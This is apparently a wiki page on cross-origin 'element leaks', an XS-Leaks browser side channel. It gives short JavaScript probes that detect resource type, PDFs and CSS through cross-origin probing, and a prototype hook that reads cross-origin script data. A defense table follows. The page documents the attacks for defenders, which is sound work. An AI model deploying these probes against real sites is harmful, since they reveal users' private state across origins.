+++
title = "Element leaks"
description = ""
category = "Attack"
abuse = [
    "HTMLElement",
]
defenses = [
]
menu = "main"
weight = 2
+++

Some HTML Elements leak data cross origin.

- [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) leaks the media `duration` and the `buffered` times.
- [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) leaks the `videoHeight` and `videoWidth` 
  some browsers may also have `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` and `webkitDecodedFrameCount`
- [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) leaks the `totalVideoFrames`.
- [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) leaks the `height` and `width` but if the image is invalid they will be 0 
  and [decode()](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) will get rejected.

Some HTML Elements have properties that predictability change when a valid resource is used this can be checked to detect what the resource type is.
```javascript
async function getType(url) {
    // Detect if resource is audio or video
    let media = document.createElement("video");
    media.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (media.videoWidth) {
    return "video";
    } else if (media.duration) {
    return "audio"
    }
    // Detect if resource is an image
    let image = new Image();
    image.src = url;
    await new Promise(r=>setTimeout(r,50));
    if (image.width) return "image";
}
```

## Abusing CORB
[CORB]({{< ref "/docs/attacks/browser-features/corb.md" >}}) is a feature of Chrome that makes reposnses empty if the wrong content type is used.
This means that if the type is wrong its not cached.
A ifCached function can be found at [Cache Probing]({{< ref "/docs/attacks/cache-probing.md" >}})
```javascript
async function isType(url, type = "script") {
  let error = false;
  // Purge url
  await ifCached(url, true);
  // Attempt to load resource
  let e = document.createElement(type);
  e.onerror = () => error = true;
  e.src = url;
  document.head.appendChild(e);
  // Wait for it to be cached if its allowed by CORB
  await new Promise(resolve => setTimeout(resolve, 500));
  // Cleanup
  document.head.removeChild(e);
  // Fix for "images" that get blocked differently.
  if (error) return false
  return ifCached(url);
}
```

## Abusing getComputedStyle
[getComputedStyle](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) can be used to leak CSS style sheets.  
This function just checks if there has been a style appled to the body.
```javascript
async function isCSS(url) {
    let link = document.createElement('link');
    link.rel = 'stylesheet';
    link.type = 'text/css';
    link.href = url;
    let style1 = JSON.stringify(getComputedStyle(document.body));
    document.head.appendChild(link);
    await new Promise(resolve => setTimeout(resolve, 500));
    let style2 = JSON.stringify(getComputedStyle(document.body));
    document.head.removeChild(link);
    return (style1 !== style2);
}
```
## PDF
There are [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) that allow some control over the content such as `zoom`, `view`, `page`, `toolbar`.  
For chrome a PDF can be detected using [frame counting]({{< ref "/docs/attacks/frame-counting.md" >}}) because an `embed` is used internally.
```javascript
async function isPDF(url) {
    let w = open(url);
    await new Promise(resolve => setTimeout(resolve, 500));
    let result = (w.length === 1);
    w.close();
    return result;
}
```
{{< hint warning  >}} There will be false positives if the page has other embeds.{{< /hint >}}

## Script tag
Leaks the contents of a cross origin script during execution.  
The contents of a function can be leaked using `.toString()` and variables may also be assigned to the `window`.  
Even if the data is not acessible from the window its still possible to hook a function that it uses.  
```javascript
let hook = window.Array.prototype.push;
window.Array.prototype.push = function() {
    console.log(this);
    return hook.apply(this, arguments);
}
```
{{< hint tip >}} A paper was made using this attack [link](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf) {{< /hint >}}

## Defense

|       Attack Alternative        | [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                          |
| :-----------------------------: | :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------: |
|   Type leaks    |                                         ✔️                                          |                          ❌                          |                                 ❌                                 |                                                                                | |
